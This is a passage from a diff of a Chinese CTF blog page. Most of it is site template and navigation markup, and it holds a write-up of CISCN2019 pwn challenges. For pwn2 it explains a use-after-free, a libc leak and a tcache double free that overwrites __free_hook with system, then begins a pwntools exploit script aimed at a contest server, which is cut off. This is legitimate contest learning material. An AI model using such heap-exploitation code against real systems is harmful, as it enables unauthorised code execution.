@@ -1,236 +1,783 @@
-
 <!DOCTYPE html>
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-
-  
-
+  <meta charset="utf-8">
   <title>CISCN2019-东北赛区线下赛-pwn | t1an5t&#39;s Treasure</title>
-
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="pwn2和pwn5为队友做出，pwn4和pwn6由我做出，pwn1没做出来，pwn3是赛后反应过来的。">
+  <meta name="keywords" content=" pwnable , ctf ">
+  <meta name="description" content="CISCN2019-东北赛区线下赛-pwn | t1an5t&#39;s Treasure">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="前言所有pwn题目的源代码都开源在了：https://github.com/NEU-NEX/NEXCTF2019 本次招新赛我为萌新准备了四道相当基础的入门题目，好像只放出了三道，有一道运维忘记放了hhh。剩下放出的题目虽然也是基础题，但对于萌新应该不太友好的，要是能都做上基本已经是很不错的水平了。 &amp;nbsp;">
 <meta name="keywords" content="pwnable,ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CISCN2019-东北赛区线下赛-pwn">
-<meta property="og:url" content="http://tianstcht.github.io/CISCN2019-东北赛区线下赛-pwn/index.html">
+<meta property="og:title" content="NEX招新赛-pwn-writeup">
+<meta property="og:url" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/index.html">
 <meta property="og:site_name" content="t1an5t&#39;s Treasure">
-<meta property="og:description" content="pwn2和pwn5为队友做出，pwn4和pwn6由我做出，pwn1没做出来，pwn3是赛后反应过来的。">
+<meta property="og:description" content="前言所有pwn题目的源代码都开源在了：https://github.com/NEU-NEX/NEXCTF2019 本次招新赛我为萌新准备了四道相当基础的入门题目，好像只放出了三道，有一道运维忘记放了hhh。剩下放出的题目虽然也是基础题，但对于萌新应该不太友好的，要是能都做上基本已经是很不错的水平了。 &amp;nbsp;">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://tianstcht.github.io/CISCN2019-%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA%E7%BA%BF%E4%B8%8B%E8%B5%9B-pwn/Snipaste_2019-06-23_09-55-10.png">
-<meta property="og:updated_time" content="2019-06-23T13:25:45.229Z">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572175200901.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572175241566.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572175347034.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572175559665.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572176002336.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572178490824.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572178611753.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572178915409.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572179252871.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180018548.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180229624.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180347956.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180378962.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180479536.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180556328.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180706224.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572181008846.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180018548.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572181528850.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572181798790.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572182436773.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572182460813.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572182651474.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572182716206.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572182777854.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572183021319.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572183525405.png">
+<meta property="og:updated_time" content="2020-02-05T12:50:39.465Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CISCN2019-东北赛区线下赛-pwn">
-<meta name="twitter:description" content="pwn2和pwn5为队友做出，pwn4和pwn6由我做出，pwn1没做出来，pwn3是赛后反应过来的。">
-<meta name="twitter:image" content="http://tianstcht.github.io/CISCN2019-%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA%E7%BA%BF%E4%B8%8B%E8%B5%9B-pwn/Snipaste_2019-06-23_09-55-10.png">
+<meta name="twitter:title" content="NEX招新赛-pwn-writeup">
+<meta name="twitter:description" content="前言所有pwn题目的源代码都开源在了：https://github.com/NEU-NEX/NEXCTF2019 本次招新赛我为萌新准备了四道相当基础的入门题目，好像只放出了三道，有一道运维忘记放了hhh。剩下放出的题目虽然也是基础题，但对于萌新应该不太友好的，要是能都做上基本已经是很不错的水平了。 &amp;nbsp;">
+<meta name="twitter:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572175200901.png">
 
-  
-
-  
+<link rel="alternate" href="/atom.xml" title="t1an5t&#39;s Treasure" type="application/atom+xml">
 
 
-  
+<link rel="icon" href="/img/head.jpg">
 
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
 
-  
+<link href="/css/hl_theme/atom-dark.css?v=1.0.1" rel="stylesheet">
 
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
 
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1"></script>
 
-  
-    <link rel="alternative" href="/atom.xml" title="t1an5t&#39;s Treasure" type="application/atom+xml">
-  
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
 
-
-  
-    <link rel="icon" href="/img/favicon.ico">
-  
-
-
-  <link rel="stylesheet" href="/css/style.css">
-  <!-- <link href="/css/show.ua.css" rel="stylesheet" type="text/css" > -->
-  <link href="http://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  <!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.min.js"></script><![endif]-->
-  <!-- <link href="/vendors/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" /> -->
-
-  <link href="/vendors/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
-
-  <script src="/js/ua-parser.min.js" type="text/javascript"></script>
-  <script src="/js/jquery.js" type="text/javascript"></script>
-  <script src="/js/jquery.min.js" type="text/javascript"></script>
-  <script src="/js/scrollReveal.js" type="text/javascript"></script>
-  <script src="http://cdn.bootcss.com/instantsearch.js/1.5.1/instantsearch.js"></script>
-  <script src="/js/algolia-search.js" type="text/javascript"></script>
-  <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
-  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script> -->
-  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
-  
-  
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
 
 
 
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
 
-
-
-  
-  
-  <!-- 
-  
-  
-  
-  
-   -->
-
-  <script>
-   var CONFIG = {
-    root: '/',
-    algolia: {
-          applicationID: "",
-          apiKey: "",
-          adminApiKey: "",
-          indexName: "",
-          hits: {"per_page":10},
-          labels: {"input_placeholder":"搜索...","hits_empty":"未发现与 「${query}」相关的内容","hits_stats":"${hits} 条相关条目，使用了 ${time} 毫秒"}
-        }
-  };
-  </script>
+<script src="/js/iconfont.js?v=1.0.1"></script>
 
 </head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value>
+</div>
 
-
-</html>
 <body>
-<div id="container">
-  <div id="wrap">
-    <header id="header">
-  <div id="banner"></div>
-  <div data-scroll-reveal="enter top"  id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">t1an5t&#39;s Treasure</a>
-      </h1>
-      
-        <h2 id="subtitle-wrap">
-          <a href="/" id="subtitle">Like to sing, dance, rap and pwn.</a>
-        </h2>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/"><i class="fa fa-home" aria-hidden="true"></i>首页</a>
-        
-          <a class="main-nav-link" href="/archives"><i class="fa fa-archive" aria-hidden="true"></i>归档</a>
-        
-          <a class="main-nav-link" href="/about_me.html"><i class="fa fa-user" aria-hidden="true"></i>关于我</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a  class="nav-icon" href="/atom.xml" title="RSS Feed"><i class="fa fa-rss" aria-hidden="true"></i></a>
-        
-        <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search"><i class="fa fa-search" aria-hidden="true"></i></a>
-      </nav>
-        <div id="local-search-input"></div>
-      <!-- 百度搜索 -->
-     <!-- <div id="search-form-wrap">
-        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
-          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
-          <input type="submit" value="" class="search-form-submit">
-          <input name=tn type=hidden value="bds">
-          <input name=cl type=hidden value="3">
-          <input name=ct type=hidden value="2097152">
-          <input type="hidden" name="si" value="tianstcht.github.io">
-        </form>
-      </div>
-      -->
-   
-    </div>
-  </div>
-</header>
-
-    <div class="outer">
-      <section id="main"><article   id="post-CISCN2019-东北赛区线下赛-pwn" class="article article-type-post" itemscope itemprop="blogPost">
-  <div data-scroll-reveal="enter top and over 0.7s"  class="article-meta">
-    <a  href="/CISCN2019-东北赛区线下赛-pwn/" class="article-date">
-  <i class="fa fa-calendar"></i>
-  <time  datetime="2019-06-23T13:13:37.000Z" itemprop="datePublished">2019-06-23</time>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/head.jpg" />
 </a>
+<div class="author">
+    <span>t1an5t</span>
+</div>
 
+<div class="icon">
     
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/ctf/">ctf</a>
-  </div>
-
-
-  </div>
-  <div class="article-inner"  >
-    
-    
-
-      <header class="article-header">
-
         
-  
-    <h1 class="article-title" itemprop="name">
-      <i class="fa fa-pencil-square-o  article-title-icon"></i>CISCN2019-东北赛区线下赛-pwn
-    </h1>
-  
+        <a title="github" href="https://github.com/tianstcht" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="email" href="mailto:1037178204@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=1037178204&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
 
 
 
-      </header>
+
+<ul>
+    <li><div class="all active">全部文章<small>(10)</small></div></li>
+    
+        
+            
+            <li><div data-rel="CTF">CTF<small>(3)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="TIPS">TIPS<small>(3)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="PWN">PWN<small>(2)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="NOTES">NOTES<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="ME">ME<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a class="about  site_url"  href="/">关于</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="10">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="/帅">0</a></li>
+            
+            <li><a target="_blank" href="/帅">1</a></li>
+            
+            <li><a target="_blank" href="/狗">2</a></li>
+            
+            <li><a target="_blank" href="/学">3</a></li>
+            
+            <li><a target="_blank" href="/弟">4</a></li>
+            
+            <li><a target="_blank" href="/:">5</a></li>
+            
+            <li><a target="_blank" href="/h">6</a></li>
+            
+            <li><a target="_blank" href="/t">7</a></li>
+            
+            <li><a target="_blank" href="/t">8</a></li>
+            
+            <li><a target="_blank" href="/p">9</a></li>
+            
+            <li><a target="_blank" href="/:">10</a></li>
+            
+            <li><a target="_blank" href="/">11</a></li>
+            
+            <li><a target="_blank" href="/">12</a></li>
+            
+            <li><a target="_blank" href="/h">13</a></li>
+            
+            <li><a target="_blank" href="/a">14</a></li>
+            
+            <li><a target="_blank" href="/n">15</a></li>
+            
+            <li><a target="_blank" href="/d">16</a></li>
+            
+            <li><a target="_blank" href="/s">17</a></li>
+            
+            <li><a target="_blank" href="/o">18</a></li>
+            
+            <li><a target="_blank" href="/m">19</a></li>
+            
+            <li><a target="_blank" href="/e">20</a></li>
+            
+            <li><a target="_blank" href="/d">21</a></li>
+            
+            <li><a target="_blank" href="/o">22</a></li>
+            
+            <li><a target="_blank" href="/g">23</a></li>
+            
+            <li><a target="_blank" href="/.">24</a></li>
+            
+            <li><a target="_blank" href="/t">25</a></li>
+            
+            <li><a target="_blank" href="/o">26</a></li>
+            
+            <li><a target="_blank" href="/p">27</a></li>
+            
+            <li><a target="_blank" href="/">28</a></li>
+            
+            <li><a target="_blank" href="/ ">29</a></li>
+            
+            <li><a target="_blank" href="/磊">30</a></li>
+            
+            <li><a target="_blank" href="/子">31</a></li>
+            
+            <li><a target="_blank" href="/哥">32</a></li>
+            
+            <li><a target="_blank" href="/:">33</a></li>
+            
+            <li><a target="_blank" href="/h">34</a></li>
+            
+            <li><a target="_blank" href="/t">35</a></li>
+            
+            <li><a target="_blank" href="/t">36</a></li>
+            
+            <li><a target="_blank" href="/p">37</a></li>
+            
+            <li><a target="_blank" href="/:">38</a></li>
+            
+            <li><a target="_blank" href="/">39</a></li>
+            
+            <li><a target="_blank" href="/">40</a></li>
+            
+            <li><a target="_blank" href="/h">41</a></li>
+            
+            <li><a target="_blank" href="/t">42</a></li>
+            
+            <li><a target="_blank" href="/t">43</a></li>
+            
+            <li><a target="_blank" href="/p">44</a></li>
+            
+            <li><a target="_blank" href="/:">45</a></li>
+            
+            <li><a target="_blank" href="/">46</a></li>
+            
+            <li><a target="_blank" href="/">47</a></li>
+            
+            <li><a target="_blank" href="/i">48</a></li>
+            
+            <li><a target="_blank" href="/g">49</a></li>
+            
+            <li><a target="_blank" href="/m">50</a></li>
+            
+            <li><a target="_blank" href="/l">51</a></li>
+            
+            <li><a target="_blank" href="/.">52</a></li>
+            
+            <li><a target="_blank" href="/t">53</a></li>
+            
+            <li><a target="_blank" href="/o">54</a></li>
+            
+            <li><a target="_blank" href="/p">55</a></li>
+            
+            <li><a target="_blank" href="/">56</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="Search..." />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color3">pwnable</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">ctf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">2019</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">kernel</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">tw</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">pwntools</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">glibc</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="CTF "
+           href="/ByteCTF2019/"
+           data-tag="pwnable,ctf,2019"
+           data-author="" >
+            <span class="post-title" title="ByteCTF2019-PWN">ByteCTF2019-PWN</span>
+            <span class="post-date" title="2019-09-19 22:33:33">2019/09/19</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/CISCN2019-东北赛区线下赛-pwn/"
+           data-tag="pwnable,ctf"
+           data-author="" >
+            <span class="post-title" title="CISCN2019-东北赛区线下赛-pwn">CISCN2019-东北赛区线下赛-pwn</span>
+            <span class="post-date" title="2019-06-23 21:13:37">2019/06/23</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/NEX招新赛-pwn-writeup/"
+           data-tag="pwnable,ctf"
+           data-author="" >
+            <span class="post-title" title="NEX招新赛-pwn-writeup">NEX招新赛-pwn-writeup</span>
+            <span class="post-date" title="2019-10-27 21:52:33">2019/10/27</span>
+        </a>
+        
+        <a  class="TIPS "
+           href="/pwn里的一些patch心得/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="pwn里的一些patch心得">pwn里的一些patch心得</span>
+            <span class="post-date" title="2019-06-23 21:13:57">2019/06/23</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/KERNEL-CSAW-2010-kernel/"
+           data-tag="pwnable,kernel"
+           data-author="" >
+            <span class="post-title" title="KERNEL-CSAW-2010-kernel">KERNEL-CSAW-2010-kernel</span>
+            <span class="post-date" title="2019-06-20 19:42:11">2019/06/20</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/pwnab13-7w/"
+           data-tag="pwnable,tw"
+           data-author="" >
+            <span class="post-title" title="pwnab13.7w">pwnab13.7w</span>
+            <span class="post-date" title="2019-06-19 15:14:30">2019/06/19</span>
+        </a>
+        
+        <a  class="TIPS "
+           href="/pwntools的使用技巧/"
+           data-tag="pwnable,pwntools"
+           data-author="" >
+            <span class="post-title" title="pwntools的使用技巧">pwntools的使用技巧</span>
+            <span class="post-date" title="2019-06-19 15:26:27">2019/06/19</span>
+        </a>
+        
+        <a  class="TIPS "
+           href="/造轮子/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="造轮子">造轮子</span>
+            <span class="post-date" title="2019-06-19 15:40:33">2019/06/19</span>
+        </a>
+        
+        <a  class="NOTES "
+           href="/glibc-malloc-c源码阅读笔记/"
+           data-tag="glibc"
+           data-author="" >
+            <span class="post-title" title="glibc-malloc.c源码阅读笔记">glibc-malloc.c源码阅读笔记</span>
+            <span class="post-date" title="2019-07-17 16:18:02">2019/07/17</span>
+        </a>
+        
+        <a  class="ME "
+           href="/t1an5t的2020/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="t1an5t的2020">t1an5t的2020</span>
+            <span class="post-date" title="1999-01-01 15:13:07">1999/01/01</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-CISCN2019-东北赛区线下赛-pwn" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">CISCN2019-东北赛区线下赛-pwn</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a  data-rel="CTF">CTF</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color3">pwnable</a>
+            
+            <a class="color4">ctf</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-02-05 20:50:48'>2019-06-23 21:13</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1-比赛中未做出"><span class="toc-text">pwn1(比赛中未做出)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn2"><span class="toc-text">pwn2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-1"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn3（比赛中未做出）"><span class="toc-text">pwn3（比赛中未做出）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-2"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn4"><span class="toc-text">pwn4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-3"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn5"><span class="toc-text">pwn5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-4"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-4"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn6"><span class="toc-text">pwn6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-5"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-5"><span class="toc-text">exp</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
     
     <div class="article-entry" itemprop="articleBody">
       
-
-        </br>
-        <span id="busuanzi_container_page_pv">
-          阅读次数<span id="busuanzi_value_page_pv"></span>
-        </span>
         <p><code>pwn2</code>和<code>pwn5</code>为队友做出，<code>pwn4</code>和<code>pwn6</code>由我做出，<code>pwn1</code>没做出来，<code>pwn3</code>是赛后反应过来的。</p>
 <a id="more"></a>
 
 <h2 id="pwn1-比赛中未做出"><a href="#pwn1-比赛中未做出" class="headerlink" title="pwn1(比赛中未做出)"></a>pwn1(比赛中未做出)</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>逆向量太大了，直接就弃了，不然我怕很耽误时间。最后发现是一个<code>scanf</code>输入时所造成的<code>off-by-null</code>，但是因为结构体有点乱，而且全局指针放在了栈上，所以分析起来过于复杂，所以估计有限时间之内做不上。</p>
 <p>有时间会考虑复盘（其实就是鸽了）</p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>首先算出用户名：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [ord(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">"H@QRPN"</span>]</span><br><span class="line">name = <span class="string">""</span></span><br><span class="line">len = len(data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len):</span><br><span class="line">    name += chr(data[i]^len)</span><br><span class="line">    len -= <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> name</span><br></pre></td></tr></table></figure>
-
+<pre><code class="python">data = [ord(x) for x in &quot;H@QRPN&quot;]
+name = &quot;&quot;
+len = len(data)
+for i in range(len):
+    name += chr(data[i]^len)
+    len -= 1
+print name</code></pre>
 <p>得到：<code>NEUQRO</code></p>
 <p>程序漏洞：</p>
 <p>在删除函数中，没有把指针置零，在打印函数中不检查下标，故存在<code>UAF</code>漏洞，可以使用<code>UnsortedBin</code>泄露<code>libc</code>地址。</p>
 <p>而且程序使用<code>libc2.27</code>，存在<code>tcache</code>机制，可以<code>double free</code>，再<code>malloc</code>可以改<code>__free_hook</code>为<code>system</code>。</p>
-<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'10.50.1.2'</span>,<span class="number">10004</span>)</span><br><span class="line"><span class="comment"># io = process("./babyHeap", aslr=False)</span></span><br><span class="line"><span class="comment"># libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">base = io.libs()[<span class="string">"/home/fun/Desktop/pwn/offline_learn/babyHeap"</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pass_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"input name\n"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(sz, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; \n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"input the size \n"</span>, str(sz))</span><br><span class="line">    io.sendafter(<span class="string">"something...\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Del</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; \n"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"input the index\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; \n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"input the index\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    pass_name(<span class="string">"NEUQRO"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span 